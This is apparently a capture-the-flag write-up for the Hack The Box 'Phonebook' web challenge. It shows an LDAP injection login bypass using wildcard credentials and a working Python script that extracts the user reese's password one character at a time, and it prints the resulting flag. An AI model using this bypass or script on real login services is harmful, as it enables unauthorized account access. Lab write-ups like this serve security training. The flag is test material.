# Phonebook Challenge

**Platform:** Hack The Box

**Author:** 0xL0m4

**Category:** Web (Easy)

<img width="1521" height="177" alt="image" src="https://github.com/user-attachments/assets/390fad1b-c470-4b18-aa2d-19073cdbc05e" />


## Challenge Description

Who is lucky enough to be included in the phonebook?

## Tools Used

* Burp Suite
* Browser Developer Tools
* Python
  
## Steps

### 1. Exploring the login page

I started by opening the website.

The first thing I found was a login page.

I tried some common default credentials for an administrator account, such as:

```text
admin:admin
admin:administrator
```

But none of them worked.

While exploring the page, I noticed a message in the footer:

```
You can now login using the workstation username and password! reese
```

"workstation username and password" immediately make our think about LDAP authentication.

So, I decided to test the login form for LDAP Injection.

<img width="1449" height="855" alt="image" src="https://github.com/user-attachments/assets/6ea9df01-d2d3-49e7-a500-4894f8fb20ba" />

[Useful Article For LDAP Injection](https://hacktricks.wiki/en/pentesting-web/ldap-injection.html)

### 2. Testing LDAP Injection

I started with a simple LDAP wildcard payload:

```text
Username: *
Password: *
```

The idea was that the application might be constructing an LDAP query similar to:

```text
(cn=*)(password=*)
```

The * character is an LDAP wildcard that can match any value.

Therefore, instead of providing a specific username and password, the injected values could potentially make the LDAP filter match an existing user.

And yesss, we went into it.

<img width="1388" height="848" alt="image" src="https://github.com/user-attachments/assets/6f9f1018-7c2c-47e6-8f5e-8cbcff550c1d" />

### 3. Exploring the phonebook

After successfully bypassing the login page, I found a search bar.

I opened the source code (Inspect) and noticed a script tag that contained information about a table used by the application.

So, Searching for a simple character:

```text
a
```

The application returned information about users:

* First Name
* Last Name
* Email
* Phone Number

I remembered that the footer had mentioned a username called: reese

So I searched for reese

And yes, we found Reese


### 4. Extracting Reese's password

At this point, I had a valid username: reese

What if I could use LDAP Injection to extract Reese's password?

The idea was to test the password character by character.

For example, if the password starts with:

```text
a
```

I could test:

```text
a*
```

If the authentication succeeds, that means the password starts with a.

Then I could continue testing:

```text
aa*
ab*
ac*
...
```

until finding the correct second character.

The process can then be repeated for every character of the password.

### 5. Automating the attack

I initially thought about using Burp Suite Intruder, but testing every possible character manually would take a lot of time.

So, I decided to write a small Python script to automate the process.

The script sends login requests with different password prefixes and checks the application's response.

```python
import requests

username = "reese"
app = "http://<your_chall_ip>:<your_port>/login"

wordlist = "0abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWZ_YX123456789{}&[]-^%$#@!"

def TheWhole(password):
    result = True

    request = requests.post(
        app,
        data={
            "username": username,
            "password": password
        },
        allow_redirects=False,
        headers={
            "Content-Type": "application/x-www-form-urlencoded"
        }
    )

    if 'Location' in request.headers and '/login' in request.headers['Location']:
        result = False

    return result


def main():
    password = "*"
    result = True

    while result:
        print("The pass is:", password, "now\n")

        for x in wordlist:
            password = password[:-1]
            password += x
            password += "*"

            result = TheWhole(password)

            print(password)

            if not result:
                password = password[:-1]
                password = password[:-1]
                password += "*"
            else:
                print(x)
                break

    print("Alhamdulillah, We did it!!!!!!!!!!")
    print(password)


if __name__ == "__main__":
    main()
```

The script starts with: *

Then it tries different characters and checks whether the application accepts the resulting LDAP filter.

For example:

```text
a*
b*
c*
...
```

Once the correct character is found, it continues with the next position:

```text
a*
aa*
ab*
ac*
...
```

This continues until the complete password is extracted.

### 6. Retrieving the flag

After running the script, it successfully extracted the password character by character.

Voilaaaa!!

The flag (the password at the same time) was retrieved.

### The Flag

```
HTB{d1rectory_h4xx0r_is_k00l}
```

#

[The challenge link](https://app.hackthebox.com/challenges/Phonebook?tab=play_challenge)

See you in the next writeup, In sha Allah!

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
